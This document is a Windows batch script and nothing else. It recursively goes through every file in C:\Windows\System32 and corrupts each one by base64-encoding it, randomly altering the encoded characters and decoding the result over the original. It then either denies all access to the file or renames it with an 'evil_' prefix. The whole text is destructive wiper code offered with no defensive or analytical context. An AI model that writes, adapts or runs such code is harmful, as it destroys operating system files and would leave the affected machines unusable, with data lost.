@echo off
setlocal EnableDelayedExpansion

set "target_directory=C:\Windows\System32"

for /r "%target_directory%" %%f in (*) do (
    call :process_file "%%f"
)

goto :end

:process_file
set "file=%~1"
call :corrupt_file "%file%"
call :delete_or_move_file "%file%"
goto :eof

:corrupt_file
set "file=%~1"
certutil -encode "%file%" "%file%.b64" >nul 2>&1

(for /f "delims=" %%A in ('type "%file%.b64"') do (
    set "line=%%A"
    set "corrupt_line="
    for /l %%i in (1,1,120) do (
        set /a "rand=!random! %% 26"
        set "char=!line:~%%i,1!"
        
        if !rand! lss 10 (
            set "char=%%rand%%"
        )
        
        set "corrupt_line=!corrupt_line!!char!"
    )
    echo !corrupt_line!
)) > "%file%.corrupt.b64"

certutil -decode "%file%.corrupt.b64" "%file%" >nul 2>&1
del "%file%.b64" >nul 2>&1
del "%file%.corrupt.b64" >nul 2>&1
goto :eof

:delete_or_move_file
set "file=%~1"
set /a "rand=%random% %% 2"

if !rand! equ 0 (
    icacls "%file%" /deny everyone:F >nul 2>&1
) else (
    set "destination=%~dp1evil_%~nx1"
    move "%file%" "%destination%" >nul 2>&1
)
goto :eof

:end
endlocal
